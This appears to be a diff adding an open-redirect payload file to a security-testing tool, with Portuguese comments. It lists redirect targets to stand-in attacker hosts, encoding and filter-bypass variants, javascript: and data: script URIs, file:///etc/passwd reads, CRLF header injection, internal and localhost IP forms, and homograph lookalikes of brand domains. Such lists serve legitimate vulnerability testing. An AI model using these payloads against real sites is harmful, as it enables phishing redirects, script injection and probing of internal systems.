@@ -1,0 +1,269 @@
+# Open Redirect Payloads - Spectra Security Suite
+# Arquivo de payloads para teste de vulnerabilidades de Open Redirect
+# Uso: python spectra.py open-redirect-scan -u "http://target.com" --payload-file redirect_payloads.txt
+#
+# Categorias:
+# - Payloads básicos
+# - Técnicas de bypass
+# - Encoding variations
+# - Protocol bypasses
+# - Advanced evasion techniques
+
+# === PAYLOADS BÁSICOS ===
+# URLs completas
+http://example.com
+https://example.com
+http://evil.com
+https://evil.com
+http://attacker.com
+https://attacker.com
+
+# URLs relativas
+//example.com
+//evil.com
+//attacker.com
+///example.com
+////evil.com
+
+# === IP ADDRESS VARIATIONS ===
+# Localhost em diferentes formatos
+http://127.0.0.1
+http://0x7f000001
+http://2130706433
+http://0177.0.0.1
+http://127.1
+http://0.0.0.0
+http://[::]
+
+# IPs maliciosos em diferentes formatos
+http://192.168.1.100
+http://0xc0a80164
+http://3232235876
+http://10.0.0.1
+http://172.16.0.1
+
+# === BYPASS TECHNIQUES ===
+# @ symbol bypasses
+http://example.com@target.com
+http://target.com@example.com
+http://evil.com@legitimate.com
+https://attacker.com@trusted.site
+
+# Fragment bypasses
+http://target.com#http://example.com
+http://target.com#//example.com
+https://target.com#https://evil.com
+http://legitimate.com#@example.com
+
+# Subdomain bypasses
+http://target.com.example.com
+http://example.com.target.com
+http://evil.target.com
+http://target.evil.com
+
+# Path bypasses
+http://target.com/../example.com
+http://target.com/..%2Fexample.com
+http://target.com/..%252Fexample.com
+http://target.com/./example.com
+http://target.com/.//example.com
+
+# === ENCODING VARIATIONS ===
+# URL encoding
+http%3A%2F%2Fexample.com
+http%3a%2f%2fexample.com
+%2F%2Fexample.com
+%2f%2fexample.com
+https%3A%2F%2Fevil.com
+
+# Double encoding
+http%253A%252F%252Fexample.com
+%252F%252Fexample.com
+https%253A%252F%252Fevil.com
+
+# Mixed encoding
+http%3A//example.com
+http:%2F%2Fexample.com
+//example%2Ecom
+//example%252Ecom
+
+# Unicode encoding
+http://еxample.com
+http://ехample.com
+http://еvil.com
+
+# === PROTOCOL BYPASSES ===
+# JavaScript
+javascript:alert('Open Redirect')
+javascript:window.location='http://example.com'
+javascript://example.com
+javascript:location='//evil.com'
+javascript:location.href='http://attacker.com'
+
+# Data URIs
+data:text/html,<script>location='http://example.com'</script>
+data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V4YW1wbGUuY29tJzwvc2NyaXB0Pg==
+data:text/html,<meta http-equiv="refresh" content="0;url=http://evil.com">
+
+# File protocol
+file:///etc/passwd
+file://example.com/etc/passwd
+file:///c:/windows/system32/drivers/etc/hosts
+
+# FTP protocol
+ftp://example.com
+ftp://evil.com
+ftp://attacker.com:21
+
+# Other protocols
+ldap://example.com
+dict://example.com
+gopher://example.com
+mailto:test@example.com
+
+# === WHITESPACE BYPASSES ===
+# Leading/trailing spaces
+ http://example.com
+http://example.com 
+	http://example.com
+http://example.com	
+
+# URL encoded whitespace
+%20http://example.com
+http://example.com%20
+%09http://example.com
+http://example.com%09
+
+# === NEWLINE/CRLF BYPASSES ===
+# Newline characters
+%0ahttp://example.com
+%0dhttp://example.com
+%0d%0ahttp://example.com
+http://example.com%0a
+http://example.com%0d
+
+# CRLF injection attempts
+http://target.com%0d%0aLocation: http://example.com
+http://target.com%0aLocation:%20http://example.com
+http://target.com%0d%0aLocation:%20//evil.com
+
+# === CASE VARIATIONS ===
+# Mixed case
+HTTP://EXAMPLE.COM
+HTTPS://EVIL.COM
+hTTp://ExAmPlE.cOm
+HtTpS://EvIl.CoM
+
+# === BACKSLASH BYPASSES (Windows) ===
+# Windows path separators
+http:\\\\example.com
+http:\\example.com
+\\\\example.com
+\\evil.com
+https:\\\\attacker.com
+
+# === NULL BYTE BYPASSES ===
+# Null byte injection
+http://example.com%00.target.com
+http://example.com%00/
+//example.com%00
+https://evil.com%00target
+
+# === QUERY PARAMETER BYPASSES ===
+# Nested redirects
+http://target.com?url=http://example.com
+http://target.com?redirect=//example.com
+http://target.com?next=https://evil.com
+http://target.com?goto=//attacker.com
+
+# === ADVANCED EVASION ===
+# Dot variations
+http://example。com
+http://example.ϲom
+http://еxample.com
+
+# Homograph attacks
+http://аpple.com
+http://gοοgle.com
+http://microsοft.com
+
+# Port variations
+http://example.com:80
+https://example.com:443
+http://evil.com:8080
+http://attacker.com:3000
+
+# Path variations
+http://example.com/
+http://example.com/path
+http://example.com/path/
+http://example.com/path/../
+
+# === COMBINATION ATTACKS ===
+# Multiple techniques combined
+http://target.com@example.com%2F%2E%2E
+//evil.com%00@target.com
+javascript://example.com/%0aalert('redirect')
+data:text/html,<script>location='//evil.com%00'</script>
+
+# === SOCIAL ENGINEERING PAYLOADS ===
+# Legitimate-looking domains
+http://google.com.evil.com
+http://facebook.com.attacker.com
+http://amazon.evil-site.com
+http://paypal.malicious.com
+
+# === MOBILE-SPECIFIC PAYLOADS ===
+# App schemes
+intent://example.com
+app://evil.com
+custom-scheme://attacker.com
+
+# === CLOUD SERVICE BYPASSES ===
+# Cloud storage redirects
+http://s3.amazonaws.com/evil-bucket
+http://storage.googleapis.com/malicious-bucket
+http://blob.core.windows.net/evil-container
+
+# === SUBDOMAIN TAKEOVER ATTEMPTS ===
+# Common subdomain patterns
+http://staging.example.com
+http://dev.example.com
+http://test.example.com
+http://www.example.com
+http://mail.example.com
+
+# === INTERNATIONAL DOMAINS ===
+# IDN domains
+http://еxample.com
+http://аmazon.com
+http://gοοgle.com
+http://microsοft.com
+
+# === LOCALHOST VARIATIONS ===
+# Different localhost representations
+http://localhost
+http://0
+http://0.0.0.0
+http://127.1
+http://127.0.1
+http://2130706433
+
+# === IPV6 BYPASSES ===
+# IPv6 addresses
+http://[::1]
+http://[::ffff:127.0.0.1]
+http://[2001:db8::1]
+
+# === ENCODED BYPASSES ===
+# Advanced encoding combinations
+%68%74%74%70%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D
+%u0068%u0074%u0074%u0070%u003A%u002F%u002F
+\x68\x74\x74\x70\x3A\x2F\x2F
+
+# === BYPASS FILTERS ===
+# Common filter bypasses
+htTP://example.com
+hxxp://example.com
+http[:]//example.com
+http(://)example.com
